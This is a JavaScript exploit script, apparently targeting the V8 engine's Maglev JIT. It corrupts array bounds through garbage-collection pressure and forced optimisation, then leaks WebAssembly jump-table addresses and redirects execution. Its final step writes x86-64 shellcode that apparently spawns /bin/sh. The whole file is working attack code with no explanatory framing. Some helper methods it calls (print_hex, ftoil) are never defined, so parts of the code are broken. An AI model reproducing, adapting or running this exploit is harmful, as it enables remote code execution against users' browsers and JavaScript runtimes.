class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.roots = new Array(0x30000);
        this.index = 0;
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }
        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }
        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    trap() {
        while (1) {}
    }
}

function trigger() {
    class C2 {}

    var corrupted_arr = [1.1];
    var gcSize = 0x4fe00000;

    function gc() { new ArrayBuffer(gcSize); }

    class C3 extends C2 {
        constructor(obj) {
            try { new.target(); } catch (e) {}
            super();
            const v12 = new Array(32);
            const v14 = new Array(64);
            for (let v13 = 0; v13 < 2; v13++) {
                if (!v13) {
                    new Array(256);
                    gc();
                    gc();
                    let fake_object_array = [1.9196715642022913e-307, 2261634.5098039214, 3.4644403541910054e-308, 5.743499907618807e-309];
                } else {
                    obj.c = v12;
                    obj.e = corrupted_arr;
                    obj.d = v14;
                }
            }
            %OptimizeMaglevOnNextCall(C3);
        }
    }

    let obj = {a: [], c: "a"};
    new C3(obj);
    new C3(obj);
    new C3(obj);
    new Array(256);
    console.log(obj.d[1]);

    return obj;
}

function exploit() {
    var addrOf_LO = new Array(0x3000);
    var wasm_code = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x09, 0x02, 0x60, 0x00, 0x00, 0x60, 0x02, 0x7f, 0x7e, 0x00,
        0x03, 0x05, 0x04, 0x00, 0x00, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x22, 0x04, 0x03, 0x6e, 0x6f, 0x70,
        0x00, 0x00, 0x04, 0x6e, 0x6f, 0x70, 0x32, 0x00, 0x01, 0x09, 0x61, 0x72, 0x62, 0x5f, 0x77, 0x72, 0x69, 0x74, 0x65,
        0x00, 0x02, 0x05, 0x73, 0x68, 0x65, 0x6c, 0x6c, 0x00, 0x03, 0x0a, 0x29, 0x04, 0x03, 0x00, 0x01, 0x0b, 0x15, 0x00,
        0x01, 0x41, 0x00, 0x41, 0xad, 0xbd, 0x03, 0x36, 0x02, 0x00, 0x41, 0x01, 0x41, 0xad, 0xbd, 0x03, 0x36, 0x02, 0x00,
        0x0b, 0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0b, 0x03, 0x00, 0x01, 0x0b
    ]);

    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var { shell, arb_write, nop, nop2 } = wasm_instance.exports;

    for (var i = 0; i < 0x30; i++) addrOf_LO[i] = 0x11221122;

    var helper = new Helpers();
    var gcSize = 0x4fe00000;
    function gc() { new ArrayBuffer(gcSize); }

    var obj = trigger();

    function pwn() {
        let leak_addr = [];
        let begin_scan = 0;
        let found = 0;
        for (let i = begin_scan; i < begin_scan + 0x5200; i++) {
            if (obj.d[i] === 1.6847547739226092e+20) {
                console.log("[*] Found the pilot at: " + i + " 0x");
                helper.print_hex(obj.d[i]);
                found = i;
                break;
            }
        }
        for (let i = found; i < found + 0x60; i++) {
            if (obj.d[i] != 1.6847547739226092e+20) leak_addr.push(obj.d[i]);
        }
        let addr_off = leak_addr[1];
        let wasm_instance_off = helper.ftoil(addr_off);
        let was_instance_off_correct = wasm_instance_off >> 8;
        let index_to_leak = Math.round((was_instance_off_correct - 1 - 0x190000) / 8);
        leak_addr = [];
        for (var i = index_to_leak; i < index_to_leak + 0x100; i++) {
            leak_addr.push(obj.d[i]);
        }
        let jump_table_start = BigInt(helper.f64toi64(leak_addr[7])) >> 8n;
        let tiering_budget_array_off = index_to_leak + 13;
        let tiering_budget_array_off_addr = BigInt(helper.f64toi64(leak_addr[13])) >> 8n;

        nop();
        nop2();
        arb_write(0, 10n);
        shell();

        let shellcode_off = 0x9c0n;
        let shr_instruction_addr = jump_table_start + 0x95cn;
        let sub_instruction_addr = jump_table_start + 0x8fan;
        let add_instruction_addr = jump_table_start + 0x960n;
        let js_instruction_addr = jump_table_start + 0x8f7n;
        let shellcode_addr = jump_table_start + shellcode_off;

        obj.d[tiering_budget_array_off] = helper.i64tof64(sub_instruction_addr << 8n);
        nop();
        nop();
        obj.d[tiering_budget_array_off] = helper.i64tof64(((js_instruction_addr + 1n) << 8n));
                nop2();
        obj.d[tiering_budget_array_off] = helper.i64tof64(((shr_instruction_addr - 4n + 3n) << 8n));
        for (let _ = 0; _ < 12; _++) {
            nop2();
        }
        obj.d[tiering_budget_array_off] = helper.i64tof64(((add_instruction_addr - 4n) << 8n));
        nop2();
        obj.d[tiering_budget_array_off] = helper.i64tof64((tiering_budget_array_off_addr << 8n));
        obj.d[tiering_budget_array_off - 9] = 0;
        obj.d[tiering_budget_array_off - 10] = helper.i64tof64((shellcode_addr << 8n));
    }

    const shellcode = [
        0x732f6e69622fb848n, 0x66525f5450990068n, 0x5e8525e54632d68n, 0x68736162000000n, 0xf583b6a5e545756n, 0x5n
    ];
    pwn();

    function final() {
        shellcode.map((code, i) => {
            arb_write(i * 8, code);
        });
        console.log("[+] spwn shell!!!");
        shell();
    }
    final();
}

exploit();

